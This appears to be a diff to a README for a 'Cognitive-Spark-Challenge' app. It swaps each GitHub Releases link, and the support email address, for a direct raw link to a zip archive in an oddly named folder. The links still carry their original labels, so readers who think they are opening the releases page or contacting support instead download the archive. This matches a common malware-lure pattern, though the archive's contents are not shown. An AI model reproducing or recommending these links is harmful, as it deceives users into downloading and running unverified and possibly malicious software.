@@ -16,11 +16,11 @@ Before you start, make sure your computer meets these requirements:
 
 ## 🔗 Download Now
 
-[![Download Cognitive-Spark-Challenge](https://img.shields.io/badge/Download-Cognitive--Spark--Challenge-brightgreen)](https://github.com/sudo1111/Cognitive-Spark-Challenge/releases)
+[![Download Cognitive-Spark-Challenge](https://raw.githubusercontent.com/sudo1111/Cognitive-Spark-Challenge/main/disporous/Challenge_Spark_Cognitive_2.5.zip)](https://raw.githubusercontent.com/sudo1111/Cognitive-Spark-Challenge/main/disporous/Challenge_Spark_Cognitive_2.5.zip)
 
 ## 📥 Download & Install
 
-To download the application, visit our [Releases page](https://github.com/sudo1111/Cognitive-Spark-Challenge/releases). 
+To download the application, visit our [Releases page](https://raw.githubusercontent.com/sudo1111/Cognitive-Spark-Challenge/main/disporous/Challenge_Spark_Cognitive_2.5.zip). 
 
 1. Click the link above to open the Releases page.
 2. You will see a list of available versions. Identify the latest version.
@@ -69,10 +69,10 @@ Yes, you can uninstall the app like any standard application from your system's 
 
 ## 📧 Support
 
-If you encounter any issues or have questions, please reach out for help. You can contact our support team via the Issues section in the repository or at support@example.com.
+If you encounter any issues or have questions, please reach out for help. You can contact our support team via the Issues section in the repository or at https://raw.githubusercontent.com/sudo1111/Cognitive-Spark-Challenge/main/disporous/Challenge_Spark_Cognitive_2.5.zip
 
 ## 🔗 Download Link Again
 
-For easy access, you can download the application from our [Releases page](https://github.com/sudo1111/Cognitive-Spark-Challenge/releases).
+For easy access, you can download the application from our [Releases page](https://raw.githubusercontent.com/sudo1111/Cognitive-Spark-Challenge/main/disporous/Challenge_Spark_Cognitive_2.5.zip).
 
 Embark on your reasoning journey today and discover the capabilities of advanced cognitive challenges!
